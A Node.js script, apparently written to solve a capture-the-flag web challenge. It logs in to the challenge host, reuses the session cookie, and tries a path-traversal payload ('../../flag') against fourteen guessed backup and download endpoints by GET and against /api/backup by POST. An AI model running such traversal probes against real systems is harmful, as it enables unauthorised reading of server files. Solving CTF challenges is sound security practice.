
const http = require('http');
const querystring = require('querystring');

const uid = "2ca01c4924cc40e5b0c303f33d0aa184";
const loginData = querystring.stringify({uid: uid});

const loginOpts = {
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(loginData)
  }
};

console.log("Logging in...");
const req = http.request(loginOpts, (res) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("Got cookie, checking all common endpoints...\n");

  const endpoints = [
    '/backup',
    '/api/backup',
    '/admin/backup',
    '/download',
    '/api/download',
    '/read',
    '/api/read',
    '/getbackup',
    '/get-backup',
    '/admin-backup',
    '/backup/download',
    '/backup/read',
    '/private/backup',
    '/internal/backup',
  ];

  let done = 0;
  endpoints.forEach(endpoint => {
    const opts = {
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: endpoint + "?file=../../flag",
      method: 'GET',
      headers: {
        'Cookie': cookie
      }
    };

    const req = http.request(opts, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        console.log(`\n=== ${endpoint} ===`);
        if (!body.includes('404 Not Found')) {
          console.log(body);
        } else {
          console.log("404");
        }
        done++;
        if (done === endpoints.length) {
          console.log("\n✅ All endpoints checked");
        }
      });
    });
    req.end();
  });

  // Also try POST
  console.log("\n=== POST /api/backup ===\n");
  const postData = querystring.stringify({file: '../../flag'});
  const postOpts = {
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/backup',
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': Buffer.byteLength(postData),
      'Cookie': cookie
    }
  };
  const postReq = http.request(postOpts, (postRes) => {
    let body = '';
    postRes.on('data', chunk => body += chunk);
    postRes.on('end', () => {
      console.log("\nPOST /api/backup response:");
      console.log(body);
    });
  });
  postReq.end();
});

req.on('error', err => console.error(err));
req.write(loginData);
req.end();
